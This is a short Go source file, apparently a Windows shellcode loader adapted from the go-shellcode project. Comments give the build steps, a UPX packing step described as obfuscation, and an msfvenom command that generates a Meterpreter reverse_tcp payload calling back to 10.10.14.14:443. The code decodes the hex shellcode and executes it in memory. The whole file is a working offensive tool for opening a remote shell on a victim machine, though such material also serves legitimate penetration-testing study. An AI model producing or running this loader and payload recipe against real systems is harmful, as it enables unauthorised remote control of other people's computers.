//compile: set GOOS=windows; set GOARCH=amd64; go build
//obfuscate: upx compress sc.exe --brute
//spin shellcode: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -b \x00 -f hex 

package main

import (
	"encoding/hex"
	"fmt"
	"os"

	shellcode "github.com/brimstone/go-shellcode"
)

// This is the main.go for https://github.com/brimstone/go-shellcode/. Full code should be taken from there, and full credit to Brimstone for the fine work.

func main() {

	//if len(os.Args) != 2 {
	//	fmt.Printf("Must have shellcode\n")
	//	os.Exit(1)
	//}
	sc :="SHELLCODE-GOES-HERE"
	sc_bin, err := hex.DecodeString(sc)
	if err != nil {
		fmt.Printf("Error decoding arg 1: %s\n", err)
		os.Exit(1)
	}

	shellcode.Run(sc_bin)
}
